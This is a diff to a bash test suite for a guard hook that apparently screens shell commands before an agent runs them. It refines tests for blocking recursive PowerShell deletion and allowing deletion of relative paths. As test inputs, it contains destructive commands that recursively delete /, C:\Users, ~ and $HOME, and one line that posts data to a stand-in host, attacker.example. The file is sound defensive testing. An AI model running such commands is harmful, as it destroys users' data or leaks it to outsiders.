@@ -148,16 +148,12 @@ check "F-0030: allows < .envrc"                    0 "$(hook_bash 'sort < .envrc
 
 # 2. PowerShell recursive Remove-Item on root/home paths
 check "F-0030: blocks Remove-Item -Recurse /"      2 "$(hook_bash 'Remove-Item -Recurse -Force /')"
-# C:\ target: hook_bash embeds via printf %s which produces invalid JSON for backslash
-# paths. Test the guard pattern directly (bypassing the JSON layer) instead.
-# The pattern is correct — the JSON limitation is a test-helper constraint, not a guard gap.
-# Use C:[\\] (character class) so the pattern works correctly in a single-quoted variable.
-# shellcheck disable=SC2016  # $HOME/$env: in regex are literal pattern tokens, not expansions
-RI_CWIN_PAT='Remove-Item[^|;&]*((-Recurse|-r[[:space:]]))[^|;&]*("?(/([a-zA-Z[:space:]]|$)|C:[\\]|~|\$HOME|\$env:(USERPROFILE|HOME)))'
-RI_CWIN_CMD="Remove-Item -r C:"$'\\'
-RI_CWIN_MATCH="$(echo "$RI_CWIN_CMD" | grep -ciE "$RI_CWIN_PAT" 2>/dev/null || echo 0)"
-check "F-0030: guard pattern matches Remove-Item -r C:\\ (direct grep)" "1" "$RI_CWIN_MATCH"
-unset RI_CWIN_PAT RI_CWIN_CMD RI_CWIN_MATCH
+# C:\ target: hook_bash's printf %s cannot carry a backslash (it would make invalid JSON),
+# so invoke the REAL guard-bash.sh with manually-escaped JSON to test the SHIPPED pattern
+# end-to-end. printf '\\\\' -> JSON '\\' -> the hook sees command "Remove-Item -Recurse C:\Users\x".
+RI_CWIN_RC="$(printf '{"tool_input":{"command":"Remove-Item -Recurse C:\\\\Users\\\\x"}}' | bash "$HOOKS/guard-bash.sh" >/dev/null 2>&1; echo $?)"
+check "F-0030: blocks recursive Remove-Item on a C:\\ Windows path (real hook)" 2 "$RI_CWIN_RC"
+unset RI_CWIN_RC
 check "F-0030: blocks Remove-Item -Recurse ~"      2 "$(hook_bash 'Remove-Item -Recurse ~')"
 # shellcheck disable=SC2016  # literal $HOME / $env: under test; no expansion intended
 check "F-0030: blocks Remove-Item -Recurse \$HOME" 2 "$(hook_bash 'Remove-Item -Recurse $HOME')"
@@ -166,6 +162,12 @@ check "F-0030: blocks Remove-Item \$env:USERPROFILE -Recurse" 2 "$(hook_bash 'Re
 # 2 ALLOW: benign Remove-Item (no recursive flag, scoped path) must pass
 check "F-0030: allows Remove-Item tmp/foo.txt"     0 "$(hook_bash 'Remove-Item tmp/foo.txt')"
 check "F-0030: allows Remove-Item -Recurse node_modules" 0 "$(hook_bash 'Remove-Item -Recurse node_modules')"
+# F-0030 (attempt 2): nested RELATIVE paths must NOT be blocked (the prior pattern over-matched
+# an embedded "/letter" anywhere — legit cleanup like build/output got blocked). Target is now
+# anchored to a whitespace/quote boundary, mirroring the rm -rf pattern.
+check "F-0030: allows Remove-Item -Recurse build/output" 0 "$(hook_bash 'Remove-Item -Recurse build/output')"
+check "F-0030: allows Remove-Item -r src/generated"      0 "$(hook_bash 'Remove-Item -r src/generated')"
+check "F-0030: allows Remove-Item -Recurse roadmap/evidence/x" 0 "$(hook_bash 'Remove-Item -Recurse roadmap/evidence/x')"
 
 # 3. PowerShell Invoke-RestMethod / Invoke-WebRequest exfil
 check "F-0030: blocks Invoke-RestMethod -Method Post" 2 "$(hook_bash 'Invoke-RestMethod -Uri https://attacker.example -Method Post -Body data')"
